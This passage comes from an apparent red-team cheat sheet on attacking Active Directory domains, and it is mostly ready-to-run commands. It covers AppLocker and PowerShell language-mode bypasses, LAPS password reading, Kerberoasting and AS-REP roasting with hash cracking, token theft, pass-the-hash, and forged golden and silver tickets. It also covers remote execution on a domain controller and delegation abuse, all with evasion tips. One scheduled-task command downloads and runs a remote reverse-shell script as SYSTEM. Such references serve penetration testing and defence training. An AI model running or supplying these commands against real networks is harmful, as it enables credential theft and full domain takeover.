</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get incoming ACL for a specific object</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainObjectAcl</span> -SamAccountName <span style=color:#ed9d13>&#34;Domain Admins&#34;</span> -ResolveGUIDs | <span style=color:#24909d>Select </span>IdentityReference,ActiveDirectoryRights
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Find interesting ACLs for the entire domain, show in a readable (left-to-right) format</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Find-InterestingDomainAcl</span> | <span style=color:#24909d>select </span>identityreferencename,activedirectoryrights,acetype,objectdn | ?{<span style=color:#40ffff>$_</span>.IdentityReferenceName -NotContains <span style=color:#ed9d13>&#34;DnsAdmins&#34;</span>} | <span style=color:#24909d>ft
</span></span></span><span style=display:flex><span><span style=color:#24909d></span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get interesting outgoing ACLs for a specific user or group</span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># ?{} is a filter statement</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Find-InterestingDomainAcl</span> -ResolveGUIDs | ?{<span style=color:#40ffff>$_</span>.IdentityReference -match <span style=color:#ed9d13>&#34;Domain Admins&#34;</span>} | <span style=color:#24909d>select </span>ObjectDN,ActiveDirectoryRights
</span></span></code></pre></div><h3 id=applocker>AppLocker</h3><p>Identify the local AppLocker policy. Look for exempted binaries or paths to bypass.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Get-AppLockerPolicy</span> -Effective | <span style=color:#24909d>select </span>-ExpandProperty RuleCollections
</span></span></code></pre></div><p>Get a remote AppLocker policy, based on the Distinguished Name of the respective Group Policy (you could identify this e.g. in BloodHound).</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Get-AppLockerPolicy</span> -Domain -LDAP <span style=color:#ed9d13>&#34;LDAP://targetdomain.com/CN={16641EA1-8DD3-4B33-A17F-9F259805B8FF},CN=Policies,CN=System,DC=targetdomain,DC=com&#34;</span>  | <span style=color:#24909d>select </span>-expandproperty RuleCollections
</span></span></code></pre></div><p>Some high-level bypass techniques:</p><ul><li>Use <a href=https://lolbas-project.github.io/>LOLBAS</a> if only (Microsoft-)signed binaries are allowed.</li><li>If binaries from <code>C:\Windows</code> are allowed (default behavior), try dropping your binaries to <code>C:\Windows\Temp</code> or <code>C:\Windows\Tasks</code>. If there are no writable subdirectories but writable files exist in this directory tree, write your file to an alternate data stream (e.g. a JScript script) and execute it from there.</li><li>Wrap your binaries in a DLL file and execute them with <code>rundll32</code> to bypass executable rules if DLL execution is not enforced (default behavior).</li><li>If binaries like Python are allowed, use those. If that doesn&rsquo;t work, try other techniques such as wrapping JScript in a HTA file or running XSL files with <code>wmic</code>.</li><li>Otherwise elevate your privileges. AppLocker rules are most often not enforced for (local) administrative users.</li></ul><h3 id=powershell-constrained-language-mode>PowerShell Constrained Language Mode</h3><p>Sometimes you may find yourself in a PowerShell session that enforces Constrained Language Mode (CLM). This is often the case when you&rsquo;re operating in an environment that enforces AppLocker (see above).</p><p>You can identify you&rsquo;re in constrained language mode by polling the following variable to get the current language mode. It will say <code>FullLanguage</code> for an unrestricted session, and <code>ConstrainedLanguage</code> for CLM. There are other language modes which I will not go into here.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#40ffff>$ExecutionContext</span>.SessionState.LanguageMode
</span></span></code></pre></div><p>The constraints posed by CLM will block many of your exploitations attempts as key functionality in PowerShell is blocked. Bypassing CLM is largely the same as bypassing AppLocker as discussed above. Another way of bypassing CLM is to bypass AppLocker to execute binaries that execute a custom PowerShell runspace (e.g. <a href=https://github.com/mgeeky/Stracciatella>Stracciatella</a>) which will be unconstrained.</p><p>Another quick and dirty bypass is to use in-line functions, which sometimes works. If e.g. <code>whoami</code> is blocked, try the following:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>&amp;{whoami}
</span></span></code></pre></div><h3 id=laps>LAPS</h3><p>The Local Administrative Password Solution (LAPS) is Microsoft&rsquo;s product for managing local admin passwords in the context of an Active Directory domain. It frequently generates strong and unique passwords for the local admin users of enrolled machines. This password property and its expiry time are then written to the computer object in Active Directory. Read access to LAPS passwords is only granted to Domain Admins by default, but often delegated to special groups.</p><p>The permission <code>ReadLAPSPassword</code> grants users or groups the ability to read the <code>ms-Mcs-AdmPwd</code> property and as such get the local admin password. You can look for this property using e.g. BloodHound or PowerView. We can also use PowerView to read the password, if we know that we have the right <code>ReadLAPSPassword</code> privilege to a machine.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Get-DomainComputer</span> -identity <span style=color:#24909d>LAPS-COMPUTER</span> -properties <span style=color:#24909d>ms-Mcs</span>-AdmPwd
</span></span></code></pre></div><p>We can also use <a href=https://github.com/leoloobeek/LAPSToolkit/blob/master/LAPSToolkit.ps1>LAPSToolkit.ps1</a> to identify which machines in the domain use LAPS, and which principals are allowed to read LAPS passwords. If we are in this group, we can get the current LAPS passwords using this tool as well.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Get computers running LAPS, along with their passwords if we&#39;re allowed to read those</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-LAPSComputers</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get groups allowed to read LAPS passwords</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Find-LAPSDelegatedGroups</span>
</span></span></code></pre></div><h2 id=lateral-movement>Lateral Movement</h2><h3 id=lateral-movement-enumeration-with-powerview>Lateral Movement Enumeration With PowerView</h3><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Find existing local admin access for user (noisy ðŸš©)</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Find-LocalAdminAccess</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Hunt for sessions of interesting users on machines where you have access (also noisy ðŸš©)</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Find-DomainUserLocation</span> -CheckAccess | ?{<span style=color:#40ffff>$_</span>.LocalAdmin -Eq True }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Look for kerberoastable users</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainUser</span> -SPN | <span style=color:#24909d>select </span>name,serviceprincipalname
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Look for AS-REP roastable users</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainUser</span> -PreauthNotRequired | <span style=color:#24909d>select </span>name
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Look for interesting ACL within the domain, filtering on a specific user or group you have compromised</span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic>## Exploitation depends on the identified ACL, some techniques are discussed in this cheat sheet</span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic>## Example for GenericWrite on user: Disable preauth or add SPN for targeted kerberoast (see below)</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Find-InterestingDomainAcl</span> -ResolveGUIDs | ?{<span style=color:#40ffff>$_</span>.IdentityReferenceName -match <span style=color:#ed9d13>&#34;UserOrGroupToQuery&#34;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Look for servers with Unconstrained Delegation enabled</span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic>## If available and you have admin privs on this server, get user TGT (see below)</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainComputer</span> -Unconstrained
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Look for users or computers with Constrained Delegation enabled</span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic>## If available and you have user/computer hash, access service machine as DA (see below)</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainUser</span> -TrustedToAuth | <span style=color:#24909d>select </span>userprincipalname,<span style=color:#24909d>msds-allowedtodelegateto</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Get-DomainComputer</span> -TrustedToAuth | <span style=color:#24909d>select </span>name,<span style=color:#24909d>msds-allowedtodelegateto</span>
</span></span></code></pre></div><h3 id=bloodhound>BloodHound</h3><p>Use <code>Invoke-BloodHound</code> from <code>SharpHound.ps1</code>, or use <code>SharpHound.exe</code>. Both can be run reflectively, get them <a href=https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors>here</a>. Examples below use the PowerShell variant but arguments are identical.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Run all checks, including restricted groups enforced through the domain  ðŸš©</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-BloodHound</span> -CollectionMethod All,GPOLocalGroup
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts so is VERY noisy ðŸš©</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-BloodHound</span> -CollectionMethod LoggedOn
</span></span></code></pre></div><p>For real engagements definitely look into the <a href=https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html>various arguments</a> that BloodHound provides for more stealthy collection and exfiltration of data.</p><h3 id=kerberoasting>Kerberoasting</h3><h4 id=automatic>Automatic</h4><p>With PowerView:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Get-DomainSPNTicket</span> -SPN <span style=color:#ed9d13>&#34;MSSQLSvc/sqlserver.targetdomain.com&#34;</span>
</span></span></code></pre></div><p>Crack the hash with Hashcat:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hashcat -a <span style=color:#3677a9>0</span> -m <span style=color:#3677a9>13100</span> hash.txt <span style=color:#ed9d13>`</span><span style=color:#24909d>pwd</span><span style=color:#ed9d13>`</span>/rockyou.txt --rules-file <span style=color:#ed9d13>`</span><span style=color:#24909d>pwd</span><span style=color:#ed9d13>`</span>/hashcat/rules/best64.rule
</span></span></code></pre></div><h4 id=manual>Manual</h4><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Request TGS for kerberoastable account (SPN)</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Add-Type</span> -AssemblyName System.IdentityModel
</span></span><span style=display:flex><span><span style=color:#24909d>New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span style=color:#ed9d13>&#34;MSSQLSvc/sqlserver.targetdomain.com&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Dump TGS to disk</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-Mimikatz</span> -Command <span style=color:#ed9d13>&#39;&#34;kerberos::list /export&#34;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Crack with TGSRepCrack</span>
</span></span><span style=display:flex><span>python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
</span></span></code></pre></div><h4 id=targeted-kerberoasting-by-setting-spn>Targeted kerberoasting by setting SPN</h4><p>We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Set-DomainObject</span> -Identity TargetUser -Set @{serviceprincipalname=<span style=color:#ed9d13>&#39;any/thing&#39;</span>}
</span></span></code></pre></div><h3 id=as-rep-roasting>AS-REP roasting</h3><p>Get the hash for a roastable user (see above for hunting). Using <code>ASREPRoast.ps1</code>:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Get-ASREPHash</span> -UserName TargetUser
</span></span></code></pre></div><p>Crack the hash with Hashcat:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hashcat -a <span style=color:#3677a9>0</span> -m <span style=color:#3677a9>18200</span> hash.txt <span style=color:#ed9d13>`</span><span style=color:#24909d>pwd</span><span style=color:#ed9d13>`</span>/rockyou.txt --rules-file <span style=color:#ed9d13>`</span><span style=color:#24909d>pwd</span><span style=color:#ed9d13>`</span>/hashcat/rules/best64.rule
</span></span></code></pre></div><h4 id=targeted-as-rep-roasting-by-disabling-kerberos-pre-authentication>Targeted AS-REP roasting by disabling Kerberos pre-authentication</h4><p>Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Set-DomainObject</span> -Identity TargetUser -XOR @{useraccountcontrol=<span style=color:#3677a9>4194304</span>}
</span></span></code></pre></div><h3 id=token-manipulation>Token Manipulation</h3><p>Tokens can be impersonated from other users with a session/running processes on the machine. Most C2 frameworks have functionality for this built-in (such as the &lsquo;Steal Token&rsquo; functionality in Cobalt Strike).</p><h4 id=incognito>Incognito</h4><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Show tokens on the machine</span>
</span></span><span style=display:flex><span>.\incognito.exe list_tokens -u
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Start new process with token of a specific user</span>
</span></span><span style=display:flex><span>.\incognito.exe execute -c <span style=color:#ed9d13>&#34;domain\user&#34;</span> C:\Windows\system32\calc.exe
</span></span></code></pre></div><blockquote><p>If you&rsquo;re using Meterpreter, you can use the built-in Incognito module with <code>use incognito</code>, the same commands are available.</p></blockquote><h4 id=invoke-tokenmanipulation>Invoke-TokenManipulation</h4><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Show all tokens on the machine</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-TokenManipulation</span> -ShowAll
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Show only unique, usable tokens on the machine</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-TokenManipulation</span> -Enumerate
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Start new process with token of a specific user</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-TokenManipulation</span> -ImpersonateUser -Username <span style=color:#ed9d13>&#34;domain\user&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Start new process with token of another process</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-TokenManipulation</span> -CreateProcess <span style=color:#ed9d13>&#34;C:\Windows\system32\calc.exe&#34;</span> -ProcessId <span style=color:#3677a9>500</span>
</span></span></code></pre></div><h3 id=lateral-movement-with-rubeus>Lateral Movement with Rubeus</h3><p>We can use Rubeus to execute a technique called &ldquo;Overpass-the-Hash&rdquo;. In this technique, instead of passing the hash directly (another technique known as Pass-the-Hash), we use the NTLM hash of an account to request a valid Kerberos ticket (TGT). We can then use this ticket to authenticate towards the domain as the target user.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Request a TGT as the target user and pass it into the current session</span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># NOTE: Make sure to clear tickets in the current session (with &#39;klist purge&#39;) to ensure you don&#39;t have multiple active TGTs</span>
</span></span><span style=display:flex><span>.\Rubeus.exe asktgt /user<span style=color:#a61717;background-color:#e3d2d2>:</span>Administrator /rc4<span style=color:#a61717;background-color:#e3d2d2>:</span>[<span style=color:#40ffff>NTLMHASH</span>] /ptt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># More stealthy variant, but requires the AES256 key (see &#39;Dumping OS credentials with Mimikatz&#39; section)</span>
</span></span><span style=display:flex><span>.\Rubeus.exe asktgt /user<span style=color:#a61717;background-color:#e3d2d2>:</span>Administrator /aes256<span style=color:#a61717;background-color:#e3d2d2>:</span>[<span style=color:#40ffff>AES256KEY</span>] /opsec /ptt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)</span>
</span></span><span style=display:flex><span>.\Rubeus.exe asktgt /user<span style=color:#a61717;background-color:#e3d2d2>:</span>Administrator /rc4<span style=color:#a61717;background-color:#e3d2d2>:</span>[<span style=color:#40ffff>NTLMHASH</span>] /createnetonly<span style=color:#a61717;background-color:#e3d2d2>:</span>C:\Windows\System32\cmd.exe
</span></span></code></pre></div><p>Once we have a TGT as the target user, we can use services as this user in a domain context, allowing us to move laterally.</p><h3 id=lateral-movement-with-mimikatz>Lateral Movement with Mimikatz</h3><p>Note that Mimikatz is incredibly versatile and is discussed in multiple sections throughout this blog. Because of this, however, the binary is also very well-detected. If you need to run Mimikatz on your target (not recommended), executing a custom version reflectively is your best bet. There are also options such as <a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1>Invoke-MimiKatz</a> or <a href=https://github.com/GhostPack/SafetyKatz>Safetykatz</a>. Note that the latter is more stealthy but does not include all functionality.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Overpass-the-hash (more risky than Rubeus, writes to LSASS memory)
</span></span><span style=display:flex><span>sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands
</span></span><span style=display:flex><span>sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256KEY] /run:powershell.exe
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># Golden ticket (domain admin, w/ some ticket properties to avoid detection)
</span></span><span style=display:flex><span>kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># Silver ticket for a specific SPN with a compromised service / machine account
</span></span><span style=display:flex><span>kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt
</span></span></code></pre></div><blockquote><p>A nice overview of the SPNs relevant for offensive purposes is provided <a href="https://adsecurity.org/?p=2011">here</a> (scroll down) and <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#pass-the-ticket-silver-tickets>here</a>.</p></blockquote><h3 id=command-execution-with-scheduled-tasks>Command execution with scheduled tasks</h3><p><em>Requires &lsquo;Host&rsquo; SPN</em></p><p>To create a task:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Mind the quotes. Use encoded commands if quoting becomes too much of a pain</span>
</span></span><span style=display:flex><span>schtasks /create /tn <span style=color:#ed9d13>&#34;shell&#34;</span> /ru <span style=color:#ed9d13>&#34;NT Authority\SYSTEM&#34;</span> /s dc.targetdomain.com /<span style=color:#24909d>sc </span>weekly /tr <span style=color:#ed9d13>&#34;Powershell.exe -c &#39;IEX (New-Object Net.WebClient).DownloadString(&#39;&#39;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&#39;&#39;&#39;)&#39;&#34;</span>
</span></span></code></pre></div><p>To trigger the task:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>schtasks /RUN /TN <span style=color:#ed9d13>&#34;shell&#34;</span> /s dc.targetdomain.com
</span></span></code></pre></div><h3 id=command-execution-with-wmi>Command execution with WMI</h3><p><em>Requires &lsquo;Host&rsquo; and &lsquo;RPCSS&rsquo; SPNs</em></p><h4 id=from-windows>From Windows</h4><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#24909d>Invoke-WmiMethod</span> win32_process -ComputerName dc.targetdomain.com -name create -argumentlist <span style=color:#ed9d13>&#34;powershell.exe -e </span><span style=color:#40ffff>$encodedCommand</span><span style=color:#ed9d13>&#34;</span>
</span></span></code></pre></div><h4 id=from-linux>From Linux</h4><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#999;font-style:italic># with password</span>
</span></span><span style=display:flex><span>impacket-wmiexec DOMAIN/targetuser:password@172.16.4.101
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># with hash</span>
</span></span><span style=display:flex><span>impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -hashes :e0e223d63905f5a7796fb1006e7dc594
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># with Kerberos authentication (make sure your client is setup to use the right ticket, and that you have a TGS with the right SPNs)</span>
</span></span><span style=display:flex><span>impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -no-pass -k
</span></span></code></pre></div><h3 id=command-execution-with-powershell-remoting>Command execution with PowerShell Remoting</h3><p><em>Requires &lsquo;CIFS&rsquo; and &lsquo;HTTP&rsquo; SPNs. May also need the &lsquo;WSMAN&rsquo; or &lsquo;RPCSS&rsquo; SPNs (depending on OS version)</em></p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#999;font-style:italic># Create credential to run as another user (not needed after e.g. Overpass-the-Hash)</span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Leave out -Credential $Cred in the below commands to run as the current user instead</span>
</span></span><span style=display:flex><span><span style=color:#40ffff>$SecPassword</span> = <span style=color:#24909d>ConvertTo-SecureString</span> <span style=color:#ed9d13>&#39;VictimUserPassword&#39;</span> -AsPlainText -Force
</span></span><span style=display:flex><span><span style=color:#40ffff>$Cred</span> = <span style=color:#24909d>New-Object</span> System.Management.Automation.PSCredential(<span style=color:#ed9d13>&#39;DOMAIN\targetuser&#39;</span>, <span style=color:#40ffff>$SecPassword</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Run a command remotely (can be used on multiple machines at once)</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-Command</span> -Credential <span style=color:#40ffff>$Cred</span> -ComputerName dc.targetdomain.com -ScriptBlock {whoami; hostname}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Launch a session as another user (prompt for password instead, for use with e.g. RDP)</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Enter-PsSession</span> -ComputerName dc.targetdomain.com -Credential DOMAIN/targetuser
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Create a persistent session (will remember variables etc.), load a script into said session, and enter a remote session prompt</span>
</span></span><span style=display:flex><span><span style=color:#40ffff>$sess</span> = <span style=color:#24909d>New-PsSession</span> -Credential <span style=color:#40ffff>$Cred</span> -ComputerName dc.targetdomain.com
</span></span><span style=display:flex><span><span style=color:#24909d>Invoke-Command</span> -Session <span style=color:#40ffff>$sess</span> -FilePath c:\path\to\file.ps1
</span></span><span style=display:flex><span><span style=color:#24909d>Enter-PsSession</span> -Session <span style=color:#40ffff>$sess</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Copy files to or from an active PowerShell remoting session</span>
</span></span><span style=display:flex><span><span style=color:#24909d>Copy-Item</span> -Path .\<span style=color:#24909d>Invoke-Mimikatz</span>.ps1 -ToSession <span style=color:#40ffff>$sess</span> -Destination <span style=color:#ed9d13>&#34;C:\Users\public\&#34;</span>
</span></span></code></pre></div><h3 id=unconstrained-delegation>Unconstrained delegation</h3><p>Unconstrained Delegation can be set on a <em>frontend service</em> (e.g., an IIS web server) to allow it to delegate on behalf of a user to <em>any service in the domain</em> (towards a <em>backend service</em>, such as an MSSQL database).</p><p>DACL UAC property: <code>TrustedForDelegation</code>.</p><h4 id=exploitation>Exploitation</h4><p>With administrative privileges on a server with Unconstrained Delegation set, we can dump the TGTs for other users that have a connection. If we do this successfully, we can impersonate the victim user towards any service in the domain.</p><p>With Mimikatz:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>sekurlsa::tickets /export
</span></span><span style=display:flex><span>kerberos::ptt c:\path\to\ticket.kirbi
</span></span></code></pre></div><p>Or with Rubeus:</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\Rubeus.exe triage
</span></span><span style=display:flex><span>.\Rubeus.exe dump /luid<span style=color:#a61717;background-color:#e3d2d2>:</span>0x5379f2 /nowrap
</span></span><span style=display:flex><span>.\Rubeus.exe ptt /ticket<span style=color:#a61717;background-color:#e3d2d2>:</span>doIFSDCC[...]
</span></span></code></pre></div><p>We can also gain the hash for a domain controller machine account, if that DC is vulnerable to the printer bug. If we do this successfully, we can DCSync the domain controller (see below) to completely compromise the current domain.</p><p>On the server with Unconstrained Delegation, monitor for new tickets with Rubeus.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\Rubeus.exe monitor /interval<span style=color:#a61717;background-color:#e3d2d2>:</span><span style=color:#3677a9>5</span> /nowrap
</span></span></code></pre></div><p>From attacking machine, entice the Domain Controller to connect using the printer bug. Binary from <a href=https://github.com/leechristensen/SpoolSample>here</a>.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\<span style=color:#24909d>MS-RPRN</span>.exe \\dc.targetdomain.com \\<span style=color:#24909d>unconstrained-server</span>.targetdomain.com
</span></span></code></pre></div><p>The TGT for the machine account of the DC should come in in the first session. We can pass this ticket into our current session to gain DCSync privileges (see below).</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\Rubeus.exe ptt /ticket<span style=color:#a61717;background-color:#e3d2d2>:</span>doIFxTCCBc...
